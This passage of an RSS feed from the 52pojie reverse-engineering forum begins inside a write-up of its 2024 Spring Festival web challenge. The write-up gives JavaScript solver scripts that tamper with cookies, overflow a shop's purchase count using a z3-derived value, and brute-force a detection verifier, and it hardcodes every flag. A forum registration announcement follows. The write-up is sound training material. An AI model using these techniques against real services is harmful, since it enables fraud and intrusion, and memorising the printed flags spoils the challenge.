rgb(255, 115, 253);">4</span>]});<br /><span style="color: rgb(150, 203, 254);">let</span> y = [x[<span style="color: rgb(255, 115, 253);">5</span>],x[<span style="color: rgb(255, 115, 253);">9</span>],x[<span style="color: rgb(255, 115, 253);">11</span>],x[<span style="color: rgb(255, 115, 253);">13</span>]].<span style="color: rgb(255, 255, 182);">map</span>(v =&gt; <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">parse</span>(<span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>(v)));<br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i <span style="color: rgb(150, 203, 254);">of</span> x) {<br />    y[<span style="color: rgb(255, 115, 253);">0</span>].box = i.box;<br />    <span style="color: rgb(150, 203, 254);">if</span> ((<span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>(<span style="color: rgb(255, 255, 182);">glue</span>(y))).labels[<span style="color: rgb(255, 115, 253);">0</span>] === <span style="color: rgb(168, 255, 96);">"motorcycle 种类正确 位置正确"</span>) {<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />}<br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i <span style="color: rgb(150, 203, 254);">of</span> x) {<br />    y[<span style="color: rgb(255, 115, 253);">1</span>].box = i.box;<br />    <span style="color: rgb(150, 203, 254);">if</span> ((<span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>(<span style="color: rgb(255, 255, 182);">glue</span>(y))).labels[<span style="color: rgb(255, 115, 253);">1</span>] === <span style="color: rgb(168, 255, 96);">"bicycle 种类正确 位置正确"</span>) {<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />}<br /><span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">let</span> i <span style="color: rgb(150, 203, 254);">of</span> x) {<br />    y[<span style="color: rgb(255, 115, 253);">3</span>].box = i.box;<br />    <span style="color: rgb(150, 203, 254);">if</span> ((<span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>(<span style="color: rgb(255, 255, 182);">glue</span>(y))).labels[<span style="color: rgb(255, 115, 253);">3</span>] === <span style="color: rgb(168, 255, 96);">"airplane 种类正确 位置正确"</span>) {<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    }<br />}<br /><span style="color: rgb(124, 124, 124);">// 正确数量 4</span><br /><span style="color: rgb(124, 124, 124);">/*<br />0: "car 种类错误"<br />1: "bus 种类错误"<br />2: "truck 种类错误"<br />3: "train 种类错误"<br />4: "fire hydrant 种类错误"<br />5: "motorcycle 种类正确 位置错误"<br />6: "traffic light 种类错误"<br />7: "traffic light 种类错误"<br />8: "cat 种类错误"<br />9: "bicycle 种类正确 位置错误"<br />10: "person 种类错误"<br />11: "boat 种类正确 位置正确"<br />12: "traffic light 种类错误"<br />13: "airplane 种类正确 位置错误"<br />*/</span></code></pre><h3>flags all</h3><p>一次性获得所有 flag 的脚本</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">const</span> { runAI } = require(<span style="color: rgb(168, 255, 96);">'./2048ai'</span>);<br /><br /><span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">main</span>(uid_value) {<br />    <span style="color: rgb(150, 203, 254);">let</span> resp = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/login"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/x-www-form-urlencoded"</span><br />        },<br />        <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(168, 255, 96);">"uid="</span> + uid_value,<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        <span style="color: rgb(168, 255, 96);">"redirect"</span>: <span style="color: rgb(168, 255, 96);">"manual"</span>,<br />    });<br />    <span style="color: rgb(150, 203, 254);">let</span> uid = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'uid='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">4</span>);<br />    <span style="color: rgb(124, 124, 124);">// flagA</span><br />    <span style="color: rgb(150, 203, 254);">let</span> flagA = resp.headers.<span style="color: rgb(255, 255, 182);">getSetCookie</span>().<span style="color: rgb(255, 255, 182);">filter</span>(v =&gt; v.<span style="color: rgb(255, 255, 182);">startsWith</span>(<span style="color: rgb(168, 255, 96);">'flagA='</span>))[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">';'</span>)[<span style="color: rgb(255, 115, 253);">0</span>].<span style="color: rgb(255, 255, 182);">slice</span>(<span style="color: rgb(255, 115, 253);">6</span>);<br />    <span style="color: rgb(150, 203, 254);">let</span> resp2 = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/auth/uid"</span>, {<br />        <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"GET"</span>,<br />        <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />            <span style="color: rgb(168, 255, 96);">"cookie"</span>: <span style="color: rgb(168, 255, 96);">`uid=<span style="color: rgb(218, 239, 163);">${flagA}</span>`</span><br />        }<br />    });<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'A:'</span>, <span style="color: rgb(150, 203, 254);">await</span> resp2.<span style="color: rgb(255, 255, 182);">text</span>(), <span style="color: rgb(168, 255, 96);">'flag1{52pj2024} flag2{xHOpRP} flag3{GRsgk2} flag4{YvJZNS}'</span>);<br />    <span style="color: rgb(124, 124, 124);">// flagB</span><br />    <span style="color: rgb(150, 203, 254);">const</span> session = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">runAI</span>(uid, money =&gt; money &gt;= <span style="color: rgb(255, 115, 253);">10</span>, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(198, 197, 254);">false</span>);<br />    <span style="color: rgb(124, 124, 124);">/* calc way:<br />from z3 import *<br />v = BitVec('a', 64)<br />s=Solver()<br />s.add(v&gt;0)<br />s.add(999063388*v&lt;10)<br />s.add(999063388*v&gt;0)<br />s.check()<br />print(s.model())<br />    */</span><br />    <span style="color: rgb(150, 203, 254);">let</span> cnt = <span style="color: rgb(168, 255, 96);">'3952873735356057550'</span>;<br />    resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/buy_item'</span>, {method: <span style="color: rgb(168, 255, 96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`shop_item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(<span style="color: rgb(255, 115, 253);">5</span>)}</span>&amp;buy_count=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(cnt)}</span>`</span>});<br />    <span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">text</span>();<br />    resp = <span style="color: rgb(150, 203, 254);">await</span> session.<span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">'/flagB/use_item'</span>, {method: <span style="color: rgb(168, 255, 96);">'POST'</span>, headers: {<span style="color: rgb(168, 255, 96);">'Content-Type'</span>: <span style="color: rgb(168, 255, 96);">'application/x-www-form-urlencoded'</span>}, body: <span style="color: rgb(168, 255, 96);">`item_id=<span style="color: rgb(218, 239, 163);">${encodeURIComponent(<span style="color: rgb(255, 115, 253);">5</span>)}</span>`</span>});<br />    <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'B:'</span>, (<span style="color: rgb(150, 203, 254);">await</span> resp.<span style="color: rgb(255, 255, 182);">json</span>()).data.<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">' '</span>)[<span style="color: rgb(255, 115, 253);">0</span>], <span style="color: rgb(168, 255, 96);">'flag5{P3prqF} flag6{20240217} flag7{Djl9NQ} flag8{OaOjIK}'</span>);<br /><br />    <span style="color: rgb(124, 124, 124);">// flagC</span><br />    <span style="color: rgb(150, 203, 254);">async</span> <span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">test</span>(inp) {<br />        <span style="color: rgb(150, 203, 254);">let</span> res = <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">fetch</span>(<span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/verify"</span>, {<br />            <span style="color: rgb(168, 255, 96);">"headers"</span>: {<br />                <span style="color: rgb(168, 255, 96);">"content-type"</span>: <span style="color: rgb(168, 255, 96);">"application/json"</span>,<br />                <span style="color: rgb(168, 255, 96);">"cookie"</span>: <span style="color: rgb(168, 255, 96);">`uid=<span style="color: rgb(218, 239, 163);">${uid}</span>`</span><br />            },<br />            <span style="color: rgb(168, 255, 96);">"referrer"</span>: <span style="color: rgb(168, 255, 96);">"https://2024challenge.52pojie.cn/flagC/index.html"</span>,<br />            <span style="color: rgb(168, 255, 96);">"body"</span>: <span style="color: rgb(255, 255, 182);">JSON</span>.<span style="color: rgb(255, 255, 182);">stringify</span>(inp),<br />            <span style="color: rgb(168, 255, 96);">"method"</span>: <span style="color: rgb(168, 255, 96);">"POST"</span>,<br />        });<br />        <span style="color: rgb(150, 203, 254);">let</span> ret = <span style="color: rgb(150, 203, 254);">await</span> res.<span style="color: rgb(255, 255, 182);">json</span>();<br />        <span style="color: rgb(150, 203, 254);">return</span> ret;<br />    }<br />    <span style="color: rgb(150, 203, 254);">await</span> <span style="color: rgb(255, 255, 182);">test</span>({<span style="color: rgb(168, 255, 96);">"boxes"</span>:[<span style="color: rgb(255, 115, 253);">0.0071830302476882935</span>,<span style="color: rgb(255, 115, 253);">0.5186262726783752</span>,<span style="color: rgb(255, 115, 253);">0.4009798765182495</span>,<span style="color: rgb(255, 115, 253);">0.6479262709617615</span>,<span style="color: rgb(255, 115, 253);">0.04319196939468384</span>,<span style="color: rgb(255, 115, 253);">0.0257604718208313</span>,<span style="color: rgb(255, 115, 253);">0.2734942138195038</span>,<span style="color: rgb(255, 115, 253);">0.4855906367301941</span>,<span style="color: rgb(255, 115, 253);">0.7787966132164001</span>,<span style="color: rgb(255, 115, 253);">0.2953517735004425</span>,<span style="color: rgb(255, 115, 253);">0.9544114470481873</span>,<span style="color: rgb(255, 115, 253);">0.45228806138038635</span>,<span style="color: rgb(255, 115, 253);">0.40771162509918213</span>,<span style="color: rgb(255, 115, 253);">0.5121312737464905</span>,<span style="color: rgb(255, 115, 253);">0.7820707559585571</span>,<span style="color: rgb(255, 115, 253);">0.7769460082054138</span>],<span style="color: rgb(168, 255, 96);">"scores"</span>:[<span style="color: rgb(255, 115, 253);">0.8548367619514465</span>,<span style="color: rgb(255, 115, 253);">0.7646901607513428</span>,<span style="color: rgb(255, 115, 253);">0.6844016909599304</span>,<span style="color: rgb(255, 115, 253);">0.42119961977005005</span>],<span style="color: rgb(168, 255, 96);">"classes"</span>:[<span style="color: rgb(255, 115, 253);">3</span>,<span style="color: rgb(255, 115, 253);">1</span>,<span style="color: rgb(255, 115, 253);">8</span>,<span style="color: rgb(255, 115, 253);">4</span>]}).<span style="color: rgb(255, 255, 182);">then</span>(v =&gt; <span style="color: rgb(198, 197, 254);">console</span>.<span style="color: rgb(255, 255, 182);">log</span>(<span style="color: rgb(168, 255, 96);">'C:'</span>, v.hint.<span style="color: rgb(255, 255, 182);">split</span>(<span style="color: rgb(168, 255, 96);">' '</span>)[<span style="color: rgb(255, 115, 253);">0</span>], <span style="color: rgb(168, 255, 96);">'flag9{KHTALK} flag10{6BxMkW} flag11{HPQfVF} flag12{HOXI}'</span>));<br />}<br /><br /><span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 115, 253);">691872</span>);</code></pre><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /><span></span></p><p><br /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1897975-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Mon, 11 Mar 2024 12:16:15 +0800</pubDate>
</item>
<item>
<title>十六周年开放注册微信抽奖活动，提前再送40个账号注册码或300论坛币，下周二下午两点开奖，详见【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告。</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140204&amp;idx=1&amp;sn=7a3bb055249cc0f61a4f486a463cd61d&amp;chksm=bd50a0388a27292eba88011f5a15d764a81df5dc8506e2aa98c44462d89214e77e1c70a11e0f&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140204&amp;idx=1&amp;sn=7a3bb055249cc0f61a4f486a463cd61d&amp;chksm=bd50a0388a27292eba88011f5a15d764a81df5dc8506e2aa98c44462d89214e77e1c70a11e0f&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span></span> <span>2024-03-09 09:25</span> <span style="display: inline-block;">北京</span>
</p>

<p></p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml" />
</p>


                    
          <div class="share_media_text">
            <div class="share_media_text_fake" id="js_text_content_fake"></div>
            <div class="share_media_text_inner js_underline_content" id="js_text_content"></div>
                        <a></a>
                      </div>
]]></content:encoded>
<pubDate>Fri, 08 Mar 2024 18:01:26 +0800</pubDate>
</item>
<item>
<title>【开放注册公告】吾爱破解论坛2024年3月13日十六周年开放注册公告</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140202&amp;idx=1&amp;sn=7dd95aeb1b06728ffabf80b96cb5b78c&amp;chksm=bd50a03e8a27292813723345291ff024137b34b76d5fcbcb17233cef50bc414346025e1ed639&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140202&amp;idx=1&amp;sn=7dd95aeb1b06728ffabf80b96cb5b78c&amp;chksm=bd50a03e8a27292813723345291ff024137b34b76d5fcbcb17233cef50bc414346025e1ed639&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
<span>吾爱pojie</span> <span>2024-03-08 16:23</span> <span style="display: inline-block;">北京</span>
</p>

<p>内有福利，再送40个账号注册码或300论坛币，吾爱破解论坛开放注册时间：2024年3月13日  12：00 -- 14：00 和  20：00 -- 22：00，赶紧上好闹钟顺便告诉小伙伴吧。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=4d4b4087&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKRP0qgyCAugN0VnYiblj3nJKlOLNIr2rdoJ8hH9icGltjmpicibCjJBfUJGwHvOmVh7InDutgLUxZKxQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">h</span><span style="display: inline-block; text-indent: initial;">o</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">A</span><span style="display: inline-block; text-indent: initial;">r</span><span style="display: inline-block; text-indent: initial;">e</span><span style="display: inline-block; text-indent: initial;"> </span><span style="display: inline-block; text-indent: initial;">W</span><span style="display: inline-block; text-indent: initial;">e</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">从</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">2</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">0</span><span style="display: inline-block; text-indent: initial;">8</span><span style="display: inline-block; text-indent: initial;">年</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">月</span><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">3</span><span style="display: inline-block; text-indent: initial;">日</span></span><span style="display: inline-block; text-indent: initial;">建</span><span style="display: inline-block; text-indent: initial;">立</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">陪</span><span style="display: inline-block; text-indent: initial;">伴</span><span style="display: inline-block; text-indent: initial;">众</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">过</span><span style="display: inline-block; text-indent: initial;">了</span><strong><span style="color: rgb(0, 0, 255); background-color: rgb(255, 255, 0);"><span style="display: inline-block; text-indent: initial;">1</span><span style="display: inline-block; text-indent: initial;">6</span><span style="display: inline-block; text-indent: initial;">年</span></span></strong><span style="display: inline-block; text-indent: initial;">艰</span><span style="display: inline-block; text-indent: initial;">辛</span><span style="display: inline-block; text-indent: initial;">而</span><span style="display: inline-block; text-indent: initial;">辉</span><span style="display: inline-block; text-indent: initial;">煌</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">风</span><span style="display: inline-block; text-indent: initial;">雨</span><span style="display: inline-block; text-indent: initial;">历</span><span style="display: inline-block; text-indent: initial;">程</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">以</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">手</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span></span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">门</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">基</span><span style="display: inline-block; text-indent: initial;">础</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">汇</span><span style="display: inline-block; text-indent: initial;">集</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">一</span><span style="display: inline-block; text-indent: initial;">大</span><span style="display: inline-block; text-indent: initial;">批</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">此</span><span style="display: inline-block; text-indent: initial;">栖</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">今</span><span style="display: inline-block; text-indent: initial;">天</span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">依</span><span style="display: inline-block; text-indent: initial;">然</span><span style="display: inline-block; text-indent: initial;">不</span><span style="display: inline-block; text-indent: initial;">忘</span><span style="display: inline-block; text-indent: initial;">初</span><span style="display: inline-block; text-indent: initial;">心</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">希</span><span style="display: inline-block; text-indent: initial;">望</span><span style="display: inline-block; text-indent: initial;">起</span><span style="display: inline-block; text-indent: initial;">到</span><span style="color: rgb(0, 0, 255);"><span style="display: inline-block; text-indent: initial;">承</span><span style="display: inline-block; text-indent: initial;">上</span><span style="display: inline-block; text-indent: initial;">启</span><span style="display: inline-block; text-indent: initial;">下</span></span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">作</span><span style="display: inline-block; text-indent: initial;">用</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">带</span><span style="display: inline-block; text-indent: initial;">领</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">好</span><span style="display: inline-block; text-indent: initial;">者</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">走</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">密</span><span style="display: inline-block; text-indent: initial;">界</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">圣</span><span style="display: inline-block; text-indent: initial;">殿</span><span style="display: inline-block; text-indent: initial;">。</span></span></p><h2 style="margin-top: 20px; margin-bottom: 20px; font-weight: bold; font-size: 24px; color: rgb(53, 53, 53); letter-spacing: normal; text-align: start; border-bottom: 2px solid rgb(204, 204, 204);"><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></h2><p style="margin-top: 15px; margin-bottom: 15px; letter-spacing: normal; text-align: start; color: rgb(68, 68, 68);"><span style="font-size: 14px;"><span><span style="display: inline-block; text-indent: initial;">我</span><span style="display: inline-block; text-indent: initial;">们</span><span style="display: inline-block; text-indent: initial;">在</span><span style="display: inline-block; text-indent: initial;">官</span><span style="display: inline-block; text-indent: initial;">方</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">信</span><span style="display: inline-block; text-indent: initial;">和</span><span style="display: inline-block; text-indent: initial;">微</span><span style="display: inline-block; text-indent: initial;">博</span><span style="display: inline-block; text-indent: initial;">收</span><span style="display: inline-block; text-indent: initial;">到</span><span style="display: inline-block; text-indent: initial;">很</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">朋</span><span style="display: inline-block; text-indent: initial;">友</span><span style="display: inline-block; text-indent: initial;">发</span><span style="display: inline-block; text-indent: initial;">来</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">消</span><span style="display: inline-block; text-indent: initial;">息</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">想</span><span style="display: inline-block; text-indent: initial;">加</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">学</span><span style="display: inline-block; text-indent: initial;">习</span><span style="display: inline-block; text-indent: initial;">交</span><span style="display: inline-block; text-indent: initial;">流</span></span><span><span style="display: inline-block; text-indent: initial;">逆</span><span style="display: inline-block; text-indent: initial;">向</span><span style="display: inline-block; text-indent: initial;">分</span><span style="display: inline-block; text-indent: initial;">析</span></span><span><span style="display: inline-block; text-indent: initial;">技</span><span style="display: inline-block; text-indent: initial;">术</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">为</span><span style="display: inline-block; text-indent: initial;">了</span><span style="display: inline-block; text-indent: initial;">让</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">融</span><span style="display: inline-block; text-indent: initial;">入</span><span style="display: inline-block; text-indent: initial;">更</span><span style="display: inline-block; text-indent: initial;">多</span><span style="display: inline-block; text-indent: initial;">的</span><span style="display: inline-block; text-indent: initial;">新</span><span style="display: inline-block; text-indent: initial;">生</span><span style="display: inline-block; text-indent: initial;">血</span><span style="display: inline-block; text-indent: initial;">液</span><span style="display: inline-block; text-indent: initial;">，</span><span style="display: inline-block; text-indent: initial;">吾</span><span style="display: inline-block; text-indent: initial;">爱</span><span style="display: inline-block; text-indent: initial;">破</span><span style="display: inline-block; text-indent: initial;">解</span><span style="display: inline-block; text-indent: initial;">论</span><span style="display: inline-block; text-indent: initial;">坛</span><span style="display: inline-block; text-indent: initial;">管</span><span style="display: inline-block; text-indent: initial;">理</span><span style="display: inline-block; text-indent: initial;">团</span><span style="display: inline-block; text-indent: initial;">队</span><span style="display: inline-block; text-indent: initial;">商</span><span style="display: inline-block; text-indent: initial;">议</span><span style="display: inline-block; text-indent: initial;">决</span><span style="display: inline-block; text-indent: initial;">定</span><span style="display: inline-block; text-indent: initial;">限</span><span style="display: inline-block; text-indent: initial;">时</span></span><span><span style="display: inline-block; text-indent: initial;">开</span><span style="display: inline-block; text-indent: initial;">放</span><span style="display: inline-block; text-indent: initial;">注</span><span style="display: inline-block; text-indent: initial;">册</span></span><span><span style="display: inline-block; text-indent: initial;">。</span></span></span></p><p style="margin-top: 